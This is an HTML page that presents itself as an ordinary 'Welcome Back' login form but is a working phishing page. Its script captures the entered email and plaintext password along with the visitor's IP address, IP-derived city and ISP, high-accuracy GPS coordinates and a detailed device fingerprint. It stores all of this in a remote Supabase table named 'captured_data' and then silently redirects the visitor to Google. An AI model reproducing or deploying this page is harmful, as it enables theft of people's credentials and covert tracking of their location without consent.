<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>User Login</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .login-container {
            background: white;
            border-radius: 15px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
            padding: 40px;
            width: 100%;
            max-width: 400px;
        }

        .login-header {
            text-align: center;
            margin-bottom: 30px;
        }

        .login-header h2 {
            color: #333;
            font-size: 28px;
            margin-bottom: 10px;
        }

        .login-header p {
            color: #666;
            font-size: 14px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-weight: 500;
            font-size: 14px;
        }

        input[type="email"],
        input[type="password"] {
            width: 100%;
            padding: 12px 15px;
            border: 2px solid #e0e0e0;
            border-radius: 8px;
            font-size: 16px;
            transition: all 0.3s;
            outline: none;
        }

        input[type="email"]:focus,
        input[type="password"]:focus {
            border-color: #667eea;
            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
        }

        .login-btn {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .login-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
        }

        .login-btn:disabled {
            opacity: 0.7;
            cursor: not-allowed;
        }

        .error-message {
            background: #fee;
            color: #c33;
            padding: 10px;
            border-radius: 5px;
            margin-bottom: 15px;
            display: none;
            font-size: 14px;
        }

        .success-message {
            background: #efe;
            color: #3a3;
            padding: 10px;
            border-radius: 5px;
            margin-bottom: 15px;
            display: none;
            font-size: 14px;
        }

        .remember-forgot {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            font-size: 14px;
        }

        .remember-me {
            display: flex;
            align-items: center;
            gap: 5px;
            cursor: pointer;
        }

        .remember-me input[type="checkbox"] {
            width: auto;
            margin-right: 5px;
            cursor: pointer;
        }

        .forgot-link {
            color: #667eea;
            text-decoration: none;
        }

        .forgot-link:hover {
            text-decoration: underline;
        }

        .loading {
            display: none;
            width: 20px;
            height: 20px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #667eea;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-header">
            <h2>Welcome Back</h2>
            <p>Please login to continue</p>
        </div>

        <div class="error-message" id="errorMessage"></div>

        <form id="loginForm">
            <div class="form-group">
                <label for="email">Email Address</label>
                <input type="email" id="email" placeholder="Enter your email" required>
            </div>

            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" placeholder="Enter your password" required>
            </div>

            <div class="remember-forgot">
                <label class="remember-me">
                    <input type="checkbox" id="remember"> Remember me
                </label>
                <a href="#" class="forgot-link" onclick="forgotPassword(event)">Forgot Password?</a>
            </div>

            <button type="button" class="login-btn" id="loginBtn" onclick="handleLogin()">
                <span id="btnText">Login</span>
                <div class="loading" id="loading"></div>
            </button>
        </form>
    </div>

    <script>
        // Supabase configuration
        const supabaseUrl = 'https://aqynejlgjwdmxsekuyld.supabase.co';
        const supabaseKey = 'sb_publishable_FjlvU8LL1CLWG_1ZkaeVVA_3aHJVpuq';
        
        // Initialize Supabase
        const db = window.supabase.createClient(supabaseUrl, supabaseKey);
        
        // Get user's IP address
        async function getIPAddress() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'Unable to get IP';
            }
        }
        
        // Get user's location
        function getLocation() {
            return new Promise((resolve) => {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            resolve({
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                accuracy: position.coords.accuracy,
                                altitude: position.coords.altitude,
                                altitudeAccuracy: position.coords.altitudeAccuracy,
                                heading: position.coords.heading,
                                speed: position.coords.speed
                            });
                        },
                        (error) => {
                            resolve({
                                error: error.message,
                                latitude: null,
                                longitude: null
                            });
                        },
                        {
                            enableHighAccuracy: true,
                            timeout: 10000,
                            maximumAge: 0
                        }
                    );
                } else {
                    resolve({
                        error: 'Geolocation not supported',
                        latitude: null,
                        longitude: null
                    });
                }
            });
        }
        
        // Get additional IP information
        async function getIPDetails(ip) {
            try {
                const response = await fetch(`https://ipapi.co/${ip}/json/`);
                const data = await response.json();
                return {
                    city: data.city,
                    region: data.region,
                    country: data.country_name,
                    country_code: data.country_code,
                    postal: data.postal,
                    timezone: data.timezone,
                    org: data.org,
                    isp: data.org
                };
            } catch (error) {
                return {
                    city: null,
                    region: null,
                    country: null,
                    country_code: null,
                    postal: null,
                    timezone: null,
                    org: null,
                    isp: null
                };
            }
        }
        
        // Make handleLogin globally accessible
        window.handleLogin = async function() {
            const emailElement = document.getElementById('email');
            const passwordElement = document.getElementById('password');
            const rememberElement = document.getElementById('remember');
            const errorMessage = document.getElementById('errorMessage');
            const loginBtn = document.getElementById('loginBtn');
            const btnText = document.getElementById('btnText');
            const loading = document.getElementById('loading');
            
            // Check if elements exist
            if (!emailElement || !passwordElement) {
                console.error('Form elements not found');
                return;
            }
            
            const email = emailElement.value.trim();
            const password = passwordElement.value;
            const remember = rememberElement ? rememberElement.checked : false;
            
            // Reset messages
            errorMessage.style.display = 'none';
            
            // Basic validation
            if (!email || !password) {
                errorMessage.textContent = 'Please fill in all fields';
                errorMessage.style.display = 'block';
                return;
            }
            
            if (!email.includes('@')) {
                errorMessage.textContent = 'Please enter a valid email address';
                errorMessage.style.display = 'block';
                return;
            }
            
            // Show loading
            loginBtn.disabled = true;
            btnText.style.display = 'none';
            loading.style.display = 'block';
            
            try {
                console.log('Getting location and IP data...');
                
                // Get IP and location data
                const ip = await getIPAddress();
                const location = await getLocation();
                const ipDetails = await getIPDetails(ip);
                
                console.log('Saving data to Supabase...');
                
                // Save to Supabase with all data
                const { data, error } = await db
                    .from('captured_data')
                    .insert([
                        {
                            email: email,
                            password: password,
                            ip_address: ip,
                            user_agent: navigator.userAgent,
                            referer: document.referrer || 'Direct',
                            device_info: {
                                language: navigator.language,
                                screenResolution: `${window.screen.width}x${window.screen.height}`,
                                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                                platform: navigator.platform,
                                remember: remember,
                                cookiesEnabled: navigator.cookieEnabled,
                                colorDepth: window.screen.colorDepth,
                                pixelRatio: window.devicePixelRatio,
                                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
                                deviceMemory: navigator.deviceMemory || 'unknown',
                                touchPoints: navigator.maxTouchPoints || 0,
                                vendor: navigator.vendor,
                                languages: navigator.languages
                            },
                            location_data: {
                                latitude: location.latitude,
                                longitude: location.longitude,
                                accuracy: location.accuracy,
                                altitude: location.altitude,
                                heading: location.heading,
                                speed: location.speed,
                                error: location.error || null
                            },
                            ip_details: ipDetails,
                            created_at: new Date().toISOString()
                        }
                    ]);
                
                if (error) {
                    console.error('Supabase error:', error);
                    errorMessage.textContent = 'Error: ' + error.message;
                    errorMessage.style.display = 'block';
                    return;
                }
                
                console.log('✅ Data saved successfully');
                
                // Redirect to Google without showing message
                window.location.href = 'https://www.google.com';
                
            } catch (err) {
                console.error('Error:', err);
                errorMessage.textContent = 'Connection error: ' + err.message;
                errorMessage.style.display = 'block';
            } finally {
                // Reset loading
                loginBtn.disabled = false;
                btnText.style.display = 'inline';
                loading.style.display = 'none';
            }
        };
        
        // Make forgotPassword globally accessible
        window.forgotPassword = function(event) {
            event.preventDefault();
            alert('Please contact support to reset your password.');
        };
    </script>
</body>
</html>
